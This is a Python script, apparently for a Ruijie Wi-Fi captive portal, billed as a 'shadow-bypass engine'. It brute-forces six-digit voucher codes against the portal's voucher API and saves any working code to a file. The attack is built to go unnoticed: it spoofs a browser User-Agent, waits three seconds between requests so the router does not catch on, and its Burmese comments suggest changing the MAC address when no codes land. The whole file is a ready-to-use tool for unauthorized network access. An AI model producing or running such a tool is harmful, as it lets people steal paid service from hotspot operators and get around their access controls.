import requests
import random
import time
import os
import re

# UI Colors
G = '\033[92m'
R = '\033[91m'
Y = '\033[93m'
C = '\033[96m'
W = '\033[0m'

def banner():
    os.system('clear')
    print(f"""
{C}╔══════════════════════════════════════════════════╗
║    {W}RUIJIE SHADOW-BYPASS ENGINE v14.0             {C}║
║    {G}Status: STEALTH OPTIMIZED                     {C}║
╚══════════════════════════════════════════════════╝{W}
    """)

def scan_vouchers():
    banner()
    url = input(f"{Y}[?] Paste New Portal URL: {W}").strip()
    
    try:
        sid = re.search(r'sessionId=([a-zA-Z0-9_\-]+)', url).group(1)
        api_url = f"{url.split('index.html')[0]}api/auth/voucher/"
    except:
        print(f"{R}[!] URL အသစ် ပြန်ယူပေးပါဗျ။{W}")
        return

    print(f"\n{G}[*] Engine Running... (Please Wait){W}")
    print(f"{C}[*] Tip: ကုဒ်ကျမလာလျှင် MAC Address ပြောင်းပေးပါ။{W}\n")

    tested = 0
    while True:
        code = "".join([str(random.randint(0, 9)) for _ in range(6)])
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest"
        }

        try:
            res = requests.post(api_url, 
                                json={"accessCode": code, "sessionId": sid, "apiVersion": 1}, 
                                headers=headers, timeout=15)
            
            tested += 1
            # Router ရဲ့ Response ထဲက တကယ့် data ကို စစ်ဆေးခြင်း
            if res.status_code == 200:
                data = res.json()
                # Fake Success မဟုတ်ဘဲ တကယ့် Success (result 0) ကိုပဲ ရှာမည်
                if data.get("result") == 0:
                    print(f"\n{G}[✔] REAL WORKING VOUCHER: {code}{W}")
                    with open("final_hits.txt", "a") as f: f.write(code + "\n")
                    break
                else:
                    print(f"{W}[{tested}] Trying: {code} {R}[Filtered]{W}", end="\r")
            
            # အရေးကြီးဆုံးအချက်: Router မရိပ်မိအောင် အချိန် ၃ စက္ကန့် ခြားပါမည်
            time.sleep(3)

        except KeyboardInterrupt: break
        except:
            print(f"\n{R}[!] Connection Lagging... Waiting 10s{W}")
            time.sleep(10)

if __name__ == "__main__":
    scan_vouchers()
